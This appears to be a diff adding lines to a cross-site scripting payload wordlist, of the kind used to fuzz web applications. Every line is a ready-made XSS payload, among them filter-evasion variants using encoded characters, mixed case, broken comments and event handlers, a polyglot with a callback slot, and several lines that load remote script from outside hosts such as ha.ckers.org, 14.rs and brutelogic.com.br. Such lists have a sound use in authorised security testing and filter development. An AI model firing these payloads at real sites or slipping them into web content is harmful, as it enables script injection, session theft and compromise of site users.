+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'`"><\x00script>javascript:alert(1)</script>
+'`"><\x3Cscript>javascript:alert(1)</script>
++ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
+<! foo="><script>javascript:alert(1)</script>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
+<!--<img src="--><img src=x onerror=javascript:alert(1)//">
+<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
+<!--[if<img src=x onerror=javascript:alert(1)//]> -->
+<!--[if]><script>javascript:alert(1)</script -->
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14; javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://google.com"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://google.com"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:alert('XSS')"
+<iframe src=http://google.com <
+\";alert('XSS');//
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="livescript:[code]">
+<BODY ONLOAD=alert('XSS')>
+<BGSOUND SRC="javascript:alert('XSS');">
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<script y="><">/*<script* */prompt()</script
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<svg/x=">"/onload=confirm()//
+<--`<img/src=` onerror=confirm``> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<!--><script src=//14.rs>
+<embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<svg onload=write()>
+";a=prompt,a()//
+"><iframe%20src="http://google.com"%%203E
+"><img src=1 onerror=alert(1)>.gif
+"><img src=x onerror=prompt(1);>
+"><img src=x onerror=window.open('https://www.google.com/');>
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+"><script src=//brutelogic.com.br&sol;1.js&num; 
+"><script src=data:&comma;alert(1)//
+"><svg onload=alert(1)//
+`<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a()%20x>`
+<sVg oNloaD=write()>
+<!--><scRipT src=//14.rs>
+<sCriPt/src=//14.rs?
+<sCRIpt x=">" src=//15.rs></script>
+'''"'-function(){{{callback}}}()-">\"><scrIpt>{callback}</scrIpt><aUdio src=x oNerror={callback}><"-'-function(){{{callback}}}()"'''
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<x style="behavior:url(%(sct)s)">
+<a id="x"><rect fill="white" width="1000" height="1000"/></a>
+<input value=<><iframe/src=javascript:confirm(1)
+<input value=<><iframe/src=javascript:console.log(1)
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCriPt x>(((confirm)))``</scRipt x>
+<w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
+<deTAiLs/open/oNtoGGle=confirm()>
+<scRiPt y="><">/*<sCRipt* */prompt()</script
+<A href="javascript%26colon;confirm()">click
+<sVg oNloaD=write()>
+<sCrIpt/"<a"/srC=data:=".<a,[8].some(confirm)>
+<svG/x=">"/oNloaD=confirm()//
+<--`<iMG/srC=` onerror=confirm``> --!>
+<SVg </onlOad ="1> (_=prompt,_(1)) "">
+<!--><scRipT src=//14.rs>
+<sCriPt/src=//14.rs?
+<sCRIpt x=">" src=//15.rs></script>
+<D3/OnMouSEenTer=[2].find(confirm)>z
+<D3"<"/OncLick="1>[confirm``]"<">z
+<D3/OnpOinTeReENter=confirm``>click here
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<svg><script>//&NewLine;confirm(1);</script </svg>
+'''"'-function(){{{callback}}}()-">\"><scrIpt>{callback}</scrIpt><aUdio src=x oNerror={callback}><"-'-function(){{{callback}}}()"'''
+";a=prompt,a()//
+"><img src=x onerror=prompt(1);>
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<x style="behavior:url(%(sct)s)">
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a id="x"><rect fill="white" width="1000" height="1000"/></a>
+javascript:confirm(1)
+javascript\x0A:javascript:confirm(1)
+\x1Cjavascript:javascript:confirm(1)
+\xE2\x81\x9Fjavascript:javascript:confirm(1)
+\xE2\x80\x85javascript:javascript:confirm(1)
